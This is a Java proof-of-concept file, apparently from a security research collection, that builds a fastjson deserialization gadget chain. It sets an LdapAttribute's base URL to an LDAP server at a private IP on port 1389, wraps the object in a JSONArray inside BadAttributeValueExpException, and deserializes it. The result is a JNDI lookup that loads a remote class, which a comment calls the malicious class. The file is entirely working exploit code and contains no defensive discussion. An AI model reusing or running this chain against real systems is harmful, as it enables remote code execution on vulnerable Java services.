package com.javasec.pocs.fastjson;

import com.alibaba.fastjson.JSONArray;
import com.alibaba.fastjson.JSONObject;
import com.javasec.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class BALdapRefBypassChain {
    public static void main(String[] args) throws Exception {
        String ldapCtxUrl = "ldap://192.168.124.9:1389/";
        Class ldapAttributeClazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
        Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(
                new Class[] {String.class});
        ldapAttributeClazzConstructor.setAccessible(true);
        Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(
                new Object[] {"name"});
        SerializeUtils.setFieldValue(ldapAttribute,"baseCtxURL",ldapCtxUrl);
        //evil为恶意类名字，切记别带包名，否则无法实例化。。。。。。。。。
        SerializeUtils.setFieldValue(ldapAttribute,"rdn",new CompositeName("t2odm4//b"));
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(ldapAttribute);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,jsonArray);
        HashMap<Object, Object> map = new HashMap<>();
        map.put(ldapAttribute,badAttributeValueExpException);
        SerializeUtils.deserTester(map);
    }
}
